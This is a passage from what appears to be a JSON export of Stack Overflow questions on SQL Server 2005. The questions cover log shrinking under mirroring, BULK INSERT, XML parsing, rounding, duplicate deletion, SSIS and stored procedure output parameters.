really hard time improving it.  Currently, there are two servers running SQL Server 2005.  I have a mirrored database (no witness) that seems to be working well.  I do a full backup at noon and at midnight.  These get backed up to tape by our service provider nightly, and I burn the backup files to dvd weekly to keep old records on hand.  Eventually I'd like to switch to log shipping, since mirroring seems kinda pointless without a witness server.</p>\n\n<p>The issue is that the transaction log is growing non-stop.  From the research I've done, it seems that I can't truncate a log file of a mirrored database.  So how do I stop the file from growing!?</p>\n\n<p>Based on <a href=\"http://www.sqlservercentral.com/Forums/Topic377087-146-1.aspx\" rel=\"nofollow\">this web page</a>, I tried this:</p>\n\n<pre><code>USE dbname\nGO\nCHECKPOINT\nGO\nBACKUP LOG dbname TO DISK='NULL' WITH NOFORMAT, INIT, NAME = N'dbnameLog Backup', SKIP, NOREWIND, NOUNLOAD\nGO\nDBCC SHRINKFILE('dbname_Log', 2048)\nGO\n</code></pre>\n\n<p>But that didn't work.  Everything else I've found says I need to disable the mirror before running the backup log command in order for it to work.</p>\n\n<h2>My Question (TL;DR)</h2>\n\n<p>How can I shrink my transaction log file without disabling the mirror?</p>\n"},{"tags":["sql","sql-server-2005","tsql","bulkinsert"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":866,"score":1,"question_id":4436021,"title":"Additional characters are coming during bulk insert","body":"<p>I am trying to bulk insert the first row from a csv file into a table with only one column.\nBut I am getting some extra characters('n++') in the begining like this:</p>\n\n<pre><code>n++First Column;Second Column;Third Column;Fourth Column;Fifth Columnm;Sixth Column\n</code></pre>\n\n<p>CSV file contents are like:</p>\n\n<pre><code>First Column;Second Column;Third Column;Fourth Column;Fifth Columnm;Sixth Column\n</code></pre>\n\n<p>You can find the test.csv file <a href=\"http://www.filefactory.com/file/b4ah0h3/n/test.csv/\" rel=\"nofollow\" title=\"here\">here</a></p>\n\n<p>And this is the code I am using to get the first row data in a table</p>\n\n<pre><code>declare @importSQL nvarchar(2000)\ndeclare @tempstr varchar(max)\ndeclare @path varchar(100)  \n\nSET @path = 'D:\\test.csv'    \n\nCREATE TABLE #tbl (line VARCHAR(max))\n\nSET @importSQL = \n'BULK INSERT #tbl \nFROM ''' + @path + ''' \nWITH ( \nLASTROW = 1,\nFIELDTERMINATOR = ''\\n'',\nROWTERMINATOR = ''\\n''\n)' \n\nEXEC sp_executesql @stmt=@importSQL \n\nSET @tempstr = (SELECT TOP 1 RTRIM(REPLACE(Line, CHAR(9), ';')) FROM #tbl)\n\nprint @tempstr\ndrop table #tbl\n</code></pre>\n\n<p>Any idea where this extra 'n++' is coming from?</p>\n"},{"tags":["c#","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":129,"score":0,"question_id":12942301,"title":"Windows Authentication to Sql Server Authentication","body":"<p>I have an existing SQL Server 2005, currently I am using in Windows Authentication and Db name is Restaurant.\nI know how to change existing SQL Server from Windows Auth to SQL Server Auth, but it doesnt locks the DB.\nIs there any way I can change my current SQL Server to SQL Server Authentication so as if any one tries to open Restaurant(DB) it'l ask for authentication.\nAnd also please tell me what needs to be connection string.</p>\n\n<p>Thanks</p>\n"},{"tags":["c#","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12986281,"title":"how to change database version from 655 to 612?","body":"<p>Error -</p>\n\n<blockquote>\n  <p><em>mdf file can not be opened because it is version 655, this version\n  support 612 or earlier</em></p>\n</blockquote>\n\n<p>Note :</p>\n\n<p>I am created this database file using SQL Server 2005 and later that file is opened in SQL Server 2008 then automatically change version from 612 to 655.</p>\n\n<p>But I currently want to open that file in SQL Server 2005.</p>\n\n<p>Any solution is possible then help me.</p>\n"},{"tags":[".net","sql-server-2005","c#-4.0"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12986216,"title":"String gets truncated when inserted in database in c#?","body":"<p>I am new to .net (Visual Studio .net 2010) trying to insert a string in database SQL Server 2005 with column datatype <code>varchar(max)</code>, it truncates the string I insert. </p>\n\n<p>I have tested insertion in query builder and string was not truncated there. Kindly help code pasted below</p>\n\n<pre><code>DirectoryInfo dir = new DirectoryInfo(MapPath(ResID_int));\n\nFileInfo[] file = dir.GetFiles();\nArrayList list = new ArrayList();\n\n//   int i = 0;\nforeach (FileInfo file2 in file)\n{\n   name = \"/Albums/\" + id+ \"/\"+ file2.Name;\n   Response.Write(name);\n   DataSet2TableAdapters.Picture1TableAdapter insert = new Picture1TableAdapter();\n   insert.InsertData(name, id);\n}\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","like-keyword"],"answer_count":4,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":23550,"score":3,"question_id":4855754,"title":"How to use like condition with multiple values in sql server 2005?","body":"<p>I need to filter out records based on some text matching in nvarchar(1000) column.\nTable has more than 400 thousands records and growing. For now, I am using Like condition:-</p>\n\n<pre><code>SELECT \n    *\nFROM\n    table_01\nWHERE\n    Text like '%A1%'\n    OR Text like '%B1%'\n    OR Text like '%C1%'\n    OR Text like '%D1%'\n</code></pre>\n\n<p>Is there any preferred work around? </p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":12440,"score":3,"question_id":2419451,"title":"SQL Server 2005 Convert VARCHAR to INT but default on invalid type","body":"<p>I have a varchar(100) column in a table that contains a mix of integers (as strings) and non-integer strings. E.g.</p>\n\n<pre><code>| dimension varchar(100) |\n| '5'                    |\n| '17'                   |\n| '3'                    |\n| 'Pyramids'             |\n| 'Western Bypass'       |\n| '15'                   |\n</code></pre>\n\n<p>How can I write an expression to, e.g. sum up all the values that are valid integers? If I were to try:</p>\n\n<pre><code>-- should return 5 + 17 + 3 + 15 = 40\nSELECT\n    SUM( CONVERT( INT, dimension ) )\nFROM\n    mytable\n</code></pre>\n\n<p>I would receive a <code>Conversion failed when converting the varchar value 'Pyramids' to data type int.</code> error.</p>\n\n<p>Is there a test I can use in my expression, much like the <code>ISNULL()</code> function, that permits me to specify a default value if the field is not a number?</p>\n"},{"tags":["sql","sql-server-2005","tsql","duplicate-removal"],"answer_count":13,"favorite_count":8,"up_vote_count":9,"down_vote_count":0,"view_count":25016,"score":9,"question_id":985384,"title":"Delete duplicate records from a SQL table without a primary key","body":"<p>I have the below table with the below records in it</p>\n\n<pre><code>create table employee\n(\n EmpId number,\n EmpName varchar2(10),\n EmpSSN varchar2(11)\n);\n\ninsert into employee values(1, 'Jack', '555-55-5555');\ninsert into employee values (2, 'Joe', '555-56-5555');\ninsert into employee values (3, 'Fred', '555-57-5555');\ninsert into employee values (4, 'Mike', '555-58-5555');\ninsert into employee values (5, 'Cathy', '555-59-5555');\ninsert into employee values (6, 'Lisa', '555-70-5555');\ninsert into employee values (1, 'Jack', '555-55-5555');\ninsert into employee values (4, 'Mike', '555-58-5555');\ninsert into employee values (5, 'Cathy', '555-59-5555');\ninsert into employee values (6 ,'Lisa', '555-70-5555');\ninsert into employee values (5, 'Cathy', '555-59-5555');\ninsert into employee values (6, 'Lisa', '555-70-5555');\n</code></pre>\n\n<p>I dont have any primary key in this table .But i have the above records in my table already.\nI want to remove the duplicate records which has the same value in EmpId and EmpSSN fields.</p>\n\n<p>Ex : Emp id 5 </p>\n\n<p>Can any one help me to frame a query to delete those duplicate records</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":5,"favorite_count":5,"up_vote_count":8,"down_vote_count":0,"view_count":13421,"score":8,"question_id":868620,"title":"SQL Script to alter ALL Foreign Keys to add ON DELETE CASCADE","body":"<p>I have a SQL 2005 database with approx 250 tables.</p>\n\n<p>I want to temporarily enable ON DELETE CASCADE to all of the Foreign Keys so that I can do a bulk delete easily.</p>\n\n<p>I then want to turn off ON DELETE CASCADE on all Foreign Keys.</p>\n\n<p>The only way I know of doing this, is to use Management Studio to generate a full database create script, do some kind of search and replace to strip out everything but Foreign Keys, save the script, then do some more search and replacing to add the ON DELETE CASCADE.</p>\n\n<p>Then I run the script, do my delete, and then run the other script.</p>\n\n<p>Is there an easier way to produce this script? This method seems far too prone to error and I will have to keep the script up to date with any other changes we make to the database, or re-generate it manually each time I may need to use it.</p>\n\n<p>Is an alternative option to run a select on the system tables to \"generate\" the script for me? Could it even be possible to run an update on a system table that enables and disables ON DELETE CASCADE?</p>\n"},{"tags":["sql","xml","sql-server-2005","xquery"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12983250,"title":"Parsing/Processing XML and Inserting Into SQL Tables","body":"<p>Following up from: <a href=\"http://stackoverflow.com/questions/12979693/is-this-xml-format-correct\">Is this XML format correct?</a></p>\n\n<p>I've got some SQL code working that loops through the QABLOCKs and prints them (the PRINTs will change to INSERTs in production).</p>\n\n<pre><code>-- XML instance\nDECLARE    @x1 XML\nSELECT @x1 = \n'\n&lt;tests&gt;\n    &lt;test id=\"1\"&gt;\n        &lt;qablock number=\"1\"&gt;\n            &lt;question&gt;What is 1 + 1?&lt;/question&gt;\n            &lt;explanation&gt;It\"s 2.&lt;/explanation&gt;\n            &lt;options&gt;\n                &lt;option number=\"1\" value=\"1\" correct=\"0\" /&gt;\n                &lt;option number=\"2\" value=\"2\" correct=\"1\" /&gt;\n                &lt;option number=\"3\" value=\"3\" correct=\"0\" /&gt;\n                &lt;option number=\"4\" value=\"4\" correct=\"0\" /&gt;\n                &lt;option number=\"5\" value=\"5\" correct=\"0\" /&gt;\n            &lt;/options&gt;\n        &lt;/qablock&gt;\n        &lt;qablock number=\"2\"&gt;\n            &lt;question&gt;What is 2 + 2?&lt;/question&gt;\n            &lt;explanation&gt;It\"s 4.&lt;/explanation&gt;\n            &lt;options&gt;\n                &lt;option number=\"1\" value=\"1\" correct=\"0\" /&gt;\n                &lt;option number=\"2\" value=\"2\" correct=\"0\" /&gt;\n                &lt;option number=\"3\" value=\"3\" correct=\"0\" /&gt;\n                &lt;option number=\"4\" value=\"4\" correct=\"1\" /&gt;\n                &lt;option number=\"5\" value=\"5\" correct=\"0\" /&gt;\n            &lt;/options&gt;\n        &lt;/qablock&gt;\n    &lt;/test&gt;\n&lt;/tests&gt;\n'\n\nDECLARE \n    @cnt INT, \n    @totCnt INT,\n    @child XML\n\n-- counter variables\nSELECT \n    @cnt = 1,\n    @totCnt = @x1.value('count(/tests/test/qablock)','INT')\n\n-- loop\nWHILE @cnt &lt;= @totCnt BEGIN\n    SELECT\n        1 AS tests_id, --this is hard-coded\n        @cnt AS qablock_number, \n        @x1.value('(/tests/test/qablock[position()=sql:variable(\"@cnt\")]/question/text())[1]','varchar(500)') AS question, \n        @x1.value('(/tests/test/qablock[position()=sql:variable(\"@cnt\")]/explanation/text())[1]','varchar(1000)') AS explanation\n\n    PRINT 'Processing Child Element: ' + CAST(@cnt AS VARCHAR)\n    PRINT 'Child element:  ' + CAST(@child AS VARCHAR(max))\n    PRINT ''\n\n    -- increment the counter variable\n    SELECT @cnt = @cnt + 1\nEND\n</code></pre>\n\n<p>I don't know if that's the correct procedure whatsoever, but at least it seems to work. What I'd like to do next is run another similar script that loops through all the OPTIONs and PRINTs them as well. For each OPTION, I need to print: QABLOCK number, OPTION number, OPTION value, and OPTION is_correct. I can't even get close. :( Here's what I've got so far:</p>\n\n<pre><code>-- XML instance\nDECLARE    @x1 XML\nSELECT @x1 = \n'\n&lt;tests&gt;\n    &lt;test id=\"1\"&gt;\n        &lt;qablock number=\"1\"&gt;\n            &lt;question&gt;What is 1 + 1?&lt;/question&gt;\n            &lt;explanation&gt;It\"s 2.&lt;/explanation&gt;\n            &lt;options&gt;\n                &lt;option number=\"1\" value=\"1\" correct=\"0\" /&gt;\n                &lt;option number=\"2\" value=\"2\" correct=\"1\" /&gt;\n                &lt;option number=\"3\" value=\"3\" correct=\"0\" /&gt;\n                &lt;option number=\"4\" value=\"4\" correct=\"0\" /&gt;\n                &lt;option number=\"5\" value=\"5\" correct=\"0\" /&gt;\n            &lt;/options&gt;\n        &lt;/qablock&gt;\n        &lt;qablock number=\"2\"&gt;\n            &lt;question&gt;What is 2 + 2?&lt;/question&gt;\n            &lt;explanation&gt;It\"s 4.&lt;/explanation&gt;\n            &lt;options&gt;\n                &lt;option number=\"1\" value=\"1\" correct=\"0\" /&gt;\n                &lt;option number=\"2\" value=\"2\" correct=\"0\" /&gt;\n                &lt;option number=\"3\" value=\"3\" correct=\"0\" /&gt;\n                &lt;option number=\"4\" value=\"4\" correct=\"1\" /&gt;\n                &lt;option number=\"5\" value=\"5\" correct=\"0\" /&gt;\n            &lt;/options&gt;\n        &lt;/qablock&gt;\n    &lt;/test&gt;\n&lt;/tests&gt;\n'\n\nDECLARE \n    @cnt INT, \n    @totCnt INT,\n    @child XML\n\n-- counter variables\nSELECT \n    @cnt = 1,\n    @totCnt = @x1.value('count(/tests/test/qablock/options/option)','INT')\n\n-- loop\nWHILE @cnt &lt;= @totCnt BEGIN\n    SELECT\n        1 AS tests_id, --hard-coded value\n        @x1.value('(/tests/test/qablock/@number)[1]','varchar(500)') AS qablock_number, \n        @x1.value('(/tests/test/qablock/options/option[position()=sql:variable(\"@cnt\")]/@number)[1]','varchar(500)') AS option_number\n\n    PRINT 'Processing Child Element: ' + CAST(@cnt AS VARCHAR)\n    PRINT 'Child element:  ' + CAST(@child AS VARCHAR(max))\n    PRINT ''\n\n    -- increment the counter variable\n    SELECT @cnt = @cnt + 1\nEND\n</code></pre>\n\n<p>So, obviously it's messed up, but I can't seem to figure out what to change. </p>\n\n<p>First of all, I don't know how to get the parent QABLOCK number of the current OPTION. </p>\n\n<p>Second, only my first 5 option_number's are displaying their numbers properly, the second 5 are showing NULL. </p>\n\n<p>P.S. Some of this code was from:\n<a href=\"http://beyondrelational.com/modules/2/blogs/28/posts/10316/xquery-lab-35-how-to-write-a-loop-to-process-all-the-child-elements-of-an-xml-value.aspx\" rel=\"nofollow\">http://beyondrelational.com/modules/2/blogs/28/posts/10316/xquery-lab-35-how-to-write-a-loop-to-process-all-the-child-elements-of-an-xml-value.aspx</a></p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","sql-server-2008"],"answer_count":6,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":894,"score":2,"question_id":7475845,"title":"Getting Number of weeks in a Month from a Datetime Column","body":"<p>I have a table called FcData and the data looks like:</p>\n\n<pre><code>Op_Date\n\n2011-02-14 11:53:40.000\n2011-02-17 16:02:19.000\n2010-02-14 12:53:40.000\n2010-02-17 14:02:19.000\n</code></pre>\n\n<p>I am looking to get the Number of weeks in That Month from Op_Date. So I am looking for output like:</p>\n\n<pre><code> Op_Date                       Number of Weeks\n\n    2011-02-14 11:53:40.000       5   \n    2011-02-17 16:02:19.000       5\n    2010-02-14 12:53:40.000       5\n    2010-02-17 14:02:19.000       5\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","sql-server-2008"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":216,"score":0,"question_id":7711336,"title":"SQL Server Rounding Issue","body":"<p>I'm using SQL Server 2005. And I'm using ROUND T-SQL function to round a decimal column value. But it seems that the rounded value is incorrect.</p>\n\n<pre><code>    PRINT ROUND(1890.124854, 2) =&gt; 1890.120000\n</code></pre>\n\n<p>As shown the ROUND function is returning 1890.12 where as it should be 1890.13. Does anyone encountered this and what should be the correct way of rounding so that I get the expected value 1890.13..?</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql-server-2005","ssis"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":3709,"score":0,"question_id":687727,"title":"SSIS external metadata column needs to be removed","body":"<p>I am creating a select statement on the fly because the column names and table name can change, but they all need to go into the same data destination. There are other commonalities that make this viable, if I need to later I will go into them. So, what it comes down to is this: I am creating the select statement with 16 columns, there will always be sixteen columns, no more, no less, the column names can change and the table name can change. When I execute the package the select statement gets built just fine but when the Data Flow tries to execute, I get the following error:</p>\n\n<p>The \"external metadata column \"ColumnName\" (79)\" needs to be removed from the external metadata column collection.</p>\n\n<p>The actual SQL Statement being generated is:</p>\n\n<p>select 0 as ColumnName, Column88 as CN1, 0 as CN2, 0 as CN3, 0 as CN4, 0 as CN5, 0 as CN6, 0 as CN7, 0 as CN8, 0 as CN9, 0 as CN10, 0 as CN11, 0 as CN12, 0 as CN13, 0 as CN14, 0 as CN15 from Table3</p>\n\n<p>The column 'Column88' is generated dynamicly and so is the table name. If source columns exist for the other ' as CNx' columns, they will appear the same way (Column88 as CN1, Column89 as CN2, Column90 as CN3, etc.) and the table name will always be in the form: Tablex where x is an integer.</p>\n\n<p>Could anyone please help me out with what is wrong and how to fix it?</p>\n\n<p>Thank you.</p>\n"},{"tags":["sql-server-2005","vbscript","asp-classic"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1489,"score":0,"question_id":4997314,"title":"Problem retrieving an OUTPUT variable from SQL Stored Procedure via ASP (Classic VBSCRIPT)","body":"<p>I'm new here and this is my first post. I created a stored procedure in SQL Server that has (4) input parameters and (1) output parameter. The stored procedure is used to insert or delete a record into / from a table. The output parameter is assigned a message to be returned to the ASP page to provide feedback as to what happened in the stored procedure. ie. \"Record Inserted\", \"Record Already Exists\", or \"Record Deleted\".</p>\n\n<p>When I run the code from the web page, records are added and deleted as they should be. The only problem I seem to be having in getting the output parameter to return a value. </p>\n\n<p>When I execute the stored procedure from SQL Server Management Studio, The output parameter is displayed. </p>\n\n<p>I've searched the internet and checked my code against other examples. I am not sure why else I wouldn't get the returned values. Any help would be greatly appreciated.</p>\n\n<pre><code>CREATE PROC My_Stored_Procedure\n    -- Add the parameters for the stored procedure here\n\n    @ContactID AS INT = '0', /* Contact ID relates to br_UID from the dbo.Reporting_Contacts table */\n    @FacNum AS CHAR(4) = '0866', /* Facility Number from the Reporting Admin Page on Intranet */\n    @EmployeeID AS CHAR(8) = '10023258', /* EmployeeID from the Reporting Admin Page on Intranet */\n    @Delete AS CHAR(1) = 'N', /* Delete flag value to be passed from webpage on Intranet */\n    @OutputMessage AS NVARCHAR(200) = 'test' OUTPUT /* To send back sucuess or error messages */\n\nAS\n\nBEGIN\n\n    -- SET NOCOUNT ON added to prevent extra result sets from\n\n    -- interfering with SELECT statements.\n\n    SET NOCOUNT ON;\n\n    -- Set variables for use in Stored Procedure\n\n\n    -- Insert statements for procedure here\n\nIF  @Delete = 'N'\n\n        BEGIN\n\n\nIF @EmployeeID  NOT IN (SELECT HGISSN FROM Main)\n\nBEGIN\n\nSelect * FROM dbo.Reporting_Contacts\n\nSET @OutputMessage = 'Contact does not exist as an employee.'\n\nEND\n\n\nIF @EmployeeID IN (SELECT employeeID FROM dbo.Reporting_Contacts WHERE EmployeeID = @EmployeeID AND FacilityNumber = @FacNum)\n\n\nBEGIN\n\nSELECT @OutputMessage = 2\n\nPRINT @OutputMessage \n\nSET @OutputMessage =  'This Person is already a contact.'\n\n\nEND\n\nIF @EmployeeID IN (SELECT HGISSN FROM dbo.EMP_Table) AND @EmployeeID NOT IN (SELECT employeeID FROM dbo.Reporting_Contacts WHERE EmployeeID = @EmployeeID AND FacilityNumber = @FacNum)\n\nBEGIN\n\nINSERT INTO dbo.Reporting_Contacts (employeeID, FacilityNumber, ContactLevel)\n\nVALUES (@EmployeeID, @FacNum, 'S')\n\nSET @OutputMessage = 'New Contact has been added.'\n\nEND\n\nEND\n\n\nELSE IF @Delete = 'Y'\n\n        BEGIN\n\n\nDELETE FROM dbo.Reporting_Contacts WHERE br_UID = @ContactID\n\n\nSET @OutputMessage = 'Record Deleted'\n\n\nEND\n\n\n\nEND\n\nSELECT @OutputMessage\n\nGO\n</code></pre>\n\n<p>This is my VBScript:</p>\n\n<pre><code>Dim addContacts__ContactID\n\naddContacts__ContactID = \"0\"\n\nif(Request(\"ContactID\") &lt;&gt; \"\") then addContacts__ContactID = Request(\"ContactID\")\n\n\n\nDim addContacts__FacNum\n\naddContacts__FacNum = LEFT(Request.Form(\"FacilityNumber\"),4)\n\nif(Request(\"FacNum\") &lt;&gt; \"\") then addContacts__FacNum = Request(\"FacNum\")\n\n\n\nDim addContacts__EmployeeID\n\naddContacts__EmployeeID = Request.Form(\"EmployeeID\")\n\nif(Request(\"EmployeeID\") &lt;&gt; \"\") then addContacts__EmployeeID = Request(\"EmployeeID\")\n\n\n\nDim addContacts__Delete\n\naddContacts__Delete = \"N\"\n\nif(Request(\"Delete\") &lt;&gt; \"\") then addContacts__Delete = Request(\"Delete\")\n\n\n\n\nDim strReturnMessage\n\n\nset addContacts = Server.CreateObject(\"ADODB.Command\")\n\naddContacts.ActiveConnection = MY_STRING\n\naddContacts.CommandText = \"My_Stored_Procedure\"\n\naddContacts.CommandType = 4 'Evaluate as a stored procedure\n\naddContacts.CommandTimeout = 0\n\naddContacts.Prepared = true\n\naddContacts.Parameters.Append addContacts.CreateParameter(\"@RETURN_VALUE\", 3, 4)\n\naddContacts.Parameters.Append addContacts.CreateParameter(\"@ContactID\", 3, 1,10,addContacts__ContactID)\n\naddContacts.Parameters.Append addContacts.CreateParameter(\"@FacNum\", 129, 1,4,addContacts__FacNum)\n\naddContacts.Parameters.Append addContacts.CreateParameter(\"@EmployeeID\", 129, 1,8,addContacts__EmployeeID)\n\naddContacts.Parameters.Append addContacts.CreateParameter(\"@Delete\", 129, 1,1,addContacts__Delete)\n\naddContacts.Parameters.Append addContacts.CreateParameter(\"@OutputMessage\", 200, 2,200)\n\n\nstrReturnMessage =  addContacts.Parameters(\"@OutputMessage\")\n</code></pre>\n"},{"tags":["sql","sql-server-2005","iis6"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12980960,"title":"Unable to access SQL Server from IIS 6.0","body":"<p>I have a ASP.NET website that needs to interact with a SQL Server database.</p>\n\n<p>The website is hosted in IIS 6.0. </p>\n\n<p>The web admin has created a domain User account EncryptedUser and \nEnable anonymous access is run under this EncryptedUser user account.\nAlso, the Integrated Windows Authentication checkbox is checked.</p>\n\n<p>I have the following Connection String in the web.config </p>\n\n<pre><code>&lt;add name=\"MyconnectionString\" connectionString=\"Data Source=MYSQLSERVER;Initial Catalog=Mydatabase;Integrated Security=True;\"/&gt;\n</code></pre>\n\n<p>I tried running this with <code>&lt;identity impersonate=\"true\"/&gt;</code></p>\n\n<p>I am unable to access data. Any thoughts?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","sql-server-2008-r2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12967467,"title":"Using Table valued function the code","body":"<pre><code>&lt;pre&gt;\nI have 3 tables and one table valued function: EmpHistory,EmpRank,Emp and fnEmpRank.\nThe sample data are given as follows:\nEmpHistory\nEmpHistID  EmpID  RankID  MonitorDate  RankName\n1          aba     JPR     2008-10-06   Junior Prof\n2          aba     JPR     2009-11-07   Junior Prof\n3          aba     TERM    2012-2-08    Termoinated Prof\n4          aba     ASST    2012-6-22     lab Assistant\n5          aba     ASST    2012-7-2      Lab Assistant\n6          aba     TSST    2012-8-4      Terminated Assistant\n\nEmpRank\nRankID    RankName\nJPR       Junior Professor\nSPR       Senior Professor\nASST      Junior Assistant\nSASST     Senior Assistant\nPL        Principal\n\nEmployee\nEmpID    EmpStartDate\naba       2008-10-06\nabc01     2007-09-23\nsdh        2009-7-26\nsbs        2012-2-8\n\n\nThe fnEmpRank function takes the emproleID and gives the employee history same as the empHistory Table. There is also empoyeerole table which has employeeroleid column.\n\nNow my problem is: I want the second last professor rank of the employee i.e in this case I want Junior Professor row(i.e) 2nd row from emphistory table). Currntly my code is using emphistory table but now intead of that table I want to use fnEmpRank as it gives the same data. I am also giving the sample code.\n\n\nselect\na.EmpID,\na.StartDate,\nJ.RankID,\nc.MonitorDate,\nfrom dbo.vwEmployee A(nolock)\nINNER join dbo.EmpHistory c(nolock) on c.Empid = a.EmpID\nand c.EmpHistoryID = (select max(c1.EmpHistoryID)\n            from dbo.EmpHistory c1(nolock)\n            where c1.Empid = c.EmpID\n            and c1.MonitorDate = \n                    (\n</code></pre>\n\n<p>I have 3 tables and one table valued function: EmpHistory,EmpRank,Emp and fnEmpRank.\n    The sample data are given as follows:</p>\n\n<p>create table EmpHistory(\nEmpHistID int,\nEmpID varchar,\nRankID varchar,\nMonitordate Date,\nRankname varchar)</p>\n\n<p>insert into EmpHistory\nselect 1,'aba','JPR','2008-10-6','Junior Professor'</p>\n\n<p>insert into EmpHistory\nselect 2,'aba','JPR','2009-11-7','Junior Professor'</p>\n\n<p>insert into EmpHistory\nselect 3,'aba','TERM','2012-2-8','Terminated Prof'</p>\n\n<p>insert into EmpHistory\nselect 4,'aba','ASST','2012-6-22','Lab Assistant'</p>\n\n<p>insert into EmpHistory\nselect 5,'aba','ASST','2012-7-2','Lab Assistant'</p>\n\n<p>insert into EmpHistory\nselect 1,'aba','JPR','2012-8-4','Terminated Assistant'</p>\n\n<p>create table EmpRank(\nRankID varchar,\nRankName varchar\n)</p>\n\n<p>insert into EmpRank\nselect 'JPR','Junior Professor'</p>\n\n<p>insert into EmpRank\nselect 'SPR','Senior Professor'</p>\n\n<p>insert into EmpRank\nselect 'ASST','Junior Assistant'</p>\n\n<p>insert into EmpRank\nselect 'SASST','Senior Assistant'</p>\n\n<p>insert into EmpRank\nselect 'PL','Principal'</p>\n\n<p>create table Employee(\nEmpID varchar,\nEmpStartDate date\n)</p>\n\n<p>insert into Employee\nselect 'aba','2008-10-06'</p>\n\n<p>insert into Employee\nselect 'abc01','2007-9-23'</p>\n\n<p>insert into Employee\nselect 'sdh','2009-7-26'</p>\n\n<p>insert into Employee\nselect 'sbs','2012-2-8'</p>\n\n<pre><code>The fnEmpRank function takes the emproleID and gives the employee history same as the empHistory Table. There is also empoyeerole table which has employeeroleid column.\n\nNow my problem is: I want the second last professor rank of the employee i.e in this case I want Junior Professor row(i.e) 2nd row from emphistory table). Currntly my code is using emphistory table but now intead of that table I want to use fnEmpRank as it gives the same data. I am also giving the sample code.\n\n\nselect\na.EmpID,\na.StartDate,\nJ.RankID,\nc.MonitorDate,\nfrom dbo.vwEmployee A(nolock)\nINNER join dbo.EmpHistory c(nolock) on c.Empid = a.EmpID\nand c.EmpHistoryID = (select max(c1.EmpHistoryID)\n            from dbo.EmpHistory c1(nolock)\n            where c1.Empid = c.EmpID\n            and c1.MonitorDate = \n                    (\n                    SELECT MAX(C2.MonitorDate)\n                    FROM dbo.EmpHistory C2\n                    WHERE C2.EmpID = C1.EmpID\n                    )\n\n                    )\njoin dbo.EmpRank d(nolock) on d.RankID = a.RankID\nleft join dbo.EmpHistory f(nolock) on f.EmpID = a.EmpID\n    and f.EmpHistoryID = (select max(g.EmpHistoryID)\n                from dbo.EmpHistory g(nolock)\n                where g.EmpID = a.EmpID\n                AND G.RankID not like 'T%'\n                and g.EmpHistoryID &amp;lt; c.EmpHistoryID)\nleft join dbo.EmpRank h(nolock) on h.RankID = f.RankID\n\nLEFT JOIN dbo.EmpHistory J(NOLOCK) ON J.EmpID = A.EmpID \n    AND J.EmpHistoryID = (\n        SELECT max(K.EmpHistoryID )\n        FROM dbo.EmpHistory K(NOLOCK) \n        WHERE K.EmpID = J.EmpID\n        AND K.AgentRankID NOT LIKE 'T%'\n        AND K.MonitorDate = (\n            SELECT max(M.MonitorDate )\n            FROM dbo.EmpHistory M(NOLOCK)\n            WHERE M.EmpID = J.EmpID \n            AND M.RankID NOT LIKE 'T%'\n        )\n    )\n\nwhere\nA.Prof=1\n c.RankID like 'T%'\nAND c.RankID &lt;&gt;'TSST'\nAND A.StartDate is not null\n\nHere there is one more problem: Even if the Employee is terminated from professor to Assitant, A.Prof values is still 1 and basically Assistant dont have the start dates but when professor are transformed to Assitant, they still contain the start date. How can I handle this in the code. Basically this code assumes that that if emp has the start date then he is the professor. Can any one help me?\n\n\n                    SELECT MAX(C2.MonitorDate)\n                    FROM dbo.EmpHistory C2\n                    WHERE C2.EmpID = C1.EmpID\n                    )\n\n                    )\njoin dbo.EmpRank d(nolock) on d.RankID = a.RankID\nleft join dbo.EmpHistory f(nolock) on f.EmpID = a.EmpID\n    and f.EmpHistoryID = (select max(g.EmpHistoryID)\n                from dbo.EmpHistory g(nolock)\n                where g.EmpID = a.EmpID\n                AND G.RankID not like 'T%'\n                and g.EmpHistoryID &lt; c.EmpHistoryID)\nleft join dbo.EmpRank h(nolock) on h.RankID = f.RankID\n\nLEFT JOIN dbo.EmpHistory J(NOLOCK) ON J.EmpID = A.EmpID \n    AND J.EmpHistoryID = (\n        SELECT max(K.EmpHistoryID )\n        FROM dbo.EmpHistory K(NOLOCK) \n        WHERE K.EmpID = J.EmpID\n        AND K.AgentRankID NOT LIKE 'T%'\n        AND K.MonitorDate = (\n            SELECT max(M.MonitorDate )\n            FROM dbo.EmpHistory M(NOLOCK)\n            WHERE M.EmpID = J.EmpID \n            AND M.RankID NOT LIKE 'T%'\n        )\n    )\n\nwhere\nA.Prof=1\n c.RankID like 'T%'\nAND c.RankID &lt;&gt;'TSST'\nAND A.StartDate is not null\n\nHere there is one more problem: Even if the Employee is terminated from professor to Assitant, A.Prof values is still 1 and basically Assistant dont have the start dates but when professor are transformed to Assitant, they still contain the start date. How can I handle this in the code. Basically this code assumes that that if emp has the start date then he is the professor. Can any one help me?\n&lt;/pre&gt;\n</code></pre>\n"},{"tags":["sql","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12973500,"title":"Sql view combining columns and rows","body":"<p>I have two tables filled by a program. One contains an 